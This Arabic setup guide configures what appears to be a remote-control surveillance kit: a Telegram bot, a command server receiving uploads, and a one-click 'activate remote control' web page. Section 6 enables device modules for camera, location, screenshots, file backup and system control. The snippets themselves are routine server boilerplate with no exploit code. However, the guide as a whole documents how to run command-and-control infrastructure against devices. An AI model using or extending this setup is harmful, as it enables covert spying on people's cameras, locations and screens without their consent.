# دليل التكوين والإعداد

## 1. إعداد بوت تيليجرام

### إنشاء بوت جديد:
1. اذهب إلى @BotFather في تيليجرام
2. أرسل `/newbot`
3. اتبع التعليمات لإنشاء البوت
4. احصل على رمز البوت (Bot Token)

### تحديث رمز البوت:
```python
# في ملف telegram-bot/bot.py
bot = telebot.TeleBot("YOUR_BOT_TOKEN_HERE")
```

## 2. إعداد الخوادم

### المنافذ المستخدمة:
- **واجهة الويب**: 3000
- **خادم التحكم**: 4000
- **بوت تيليجرام**: لا يحتاج منفذ

### تغيير المنافذ:
```javascript
// في web-interface/server.js
app.listen(3000, () => {
    console.log('خادم الواجهة يعمل على http://localhost:3000');
});

// في command-server/server.js
server.listen(4000, () => {
    console.log('خادم التحكم يعمل على http://localhost:4000');
});
```

## 3. إعداد قاعدة البيانات

### قاعدة البيانات الافتراضية:
- النوع: SQLite
- الموقع: `database/devices.db`
- يتم إنشاؤها تلقائياً عند تشغيل البوت

### تغيير نوع قاعدة البيانات:
```python
# في telegram-bot/bot.py
# يمكن تغييرها إلى MySQL أو PostgreSQL
DB_FILE = 'devices.db'  # أو 'mysql://user:pass@localhost/db'
```

## 4. إعداد الأمان

### تشفير الاتصالات:
```javascript
// في command-server/server.js
const https = require('https');
const fs = require('fs');

const options = {
    key: fs.readFileSync('path/to/key.pem'),
    cert: fs.readFileSync('path/to/cert.pem')
};

https.createServer(options, app).listen(4000);
```

### إضافة مصادقة:
```javascript
// إضافة middleware للمصادقة
app.use('/api', (req, res, next) => {
    const token = req.headers.authorization;
    if (!token || token !== 'YOUR_SECRET_TOKEN') {
        return res.status(401).send('غير مصرح');
    }
    next();
});
```

## 5. تخصيص الواجهة

### تغيير الألوان:
```css
/* في web-interface/public/styles.css */
:root {
    --primary-color: #3498db;
    --secondary-color: #2980b9;
    --background-color: #f5f7fa;
    --text-color: #333;
}
```

### تغيير النصوص:
```html
<!-- في web-interface/public/index.html -->
<h1>تفعيل نظام التحكم عن بعد</h1>
<p>بعد النقر على الزر، سيتم تفعيل النظام تلقائياً</p>
```

## 6. إعداد الوحدات

### تفعيل/إلغاء تفعيل الوحدات:
```javascript
// في device-scripts/main-controller.js
getCapabilities() {
    return {
        backup: true,      // تفعيل النسخ الاحتياطي
        camera: true,      // تفعيل الكاميرا
        system: true,      // تفعيل التحكم في النظام
        location: true,    // تفعيل الموقع
        screenshot: true   // تفعيل لقطات الشاشة
    };
}
```

## 7. إعداد التخزين

### تغيير مجلد التخزين:
```javascript
// في command-server/upload-handler.js
class UploadHandler {
    constructor(uploadDir = '/path/to/your/storage') {
        this.uploadDir = uploadDir;
    }
}
```

### إعداد النسخ الاحتياطي التلقائي:
```javascript
// إضافة وظيفة النسخ الاحتياطي
setInterval(() => {
    // نسخ الملفات إلى موقع آخر
    backupFiles();
}, 24 * 60 * 60 * 1000); // كل 24 ساعة
```

## 8. إعداد المراقبة

### إضافة سجلات مفصلة:
```javascript
// في جميع الملفات
const winston = require('winston');

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.json(),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' })
    ]
});
```

### إعداد التنبيهات:
```javascript
// إرسال تنبيهات عند حدوث أخطاء
function sendAlert(message) {
    // إرسال عبر البريد الإلكتروني أو تيليجرام
    console.error('تنبيه:', message);
}
```

## 9. إعداد الأداء

### تحسين الأداء:
```javascript
// في command-server/server.js
const compression = require('compression');
app.use(compression());

// تحسين WebSocket
wss.setMaxListeners(1000);
```

### إعداد التخزين المؤقت:
```javascript
// إضافة Redis للتخزين المؤقت
const redis = require('redis');
const client = redis.createClient();

client.on('connect', () => {
    console.log('تم الاتصال بـ Redis');
});
```

## 10. إعداد النشر

### إعداد PM2:
```bash
# تثبيت PM2
npm install -g pm2

# إنشاء ملف ecosystem.config.js
pm2 ecosystem

# تشغيل التطبيق
pm2 start ecosystem.config.js
```

### إعداد Docker:
```dockerfile
# Dockerfile
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000 4000
CMD ["npm", "start"]
```

## ملاحظات مهمة:

1. **الأمان**: تأكد من تغيير جميع كلمات المرور والرموز الافتراضية
2. **النسخ الاحتياطي**: قم بإعداد نسخ احتياطي منتظم لقاعدة البيانات والملفات
3. **المراقبة**: راقب أداء النظام واستهلاك الموارد
4. **التحديثات**: حافظ على تحديث التبعيات والمكتبات
5. **التوثيق**: وثق أي تغييرات تقوم بها في النظام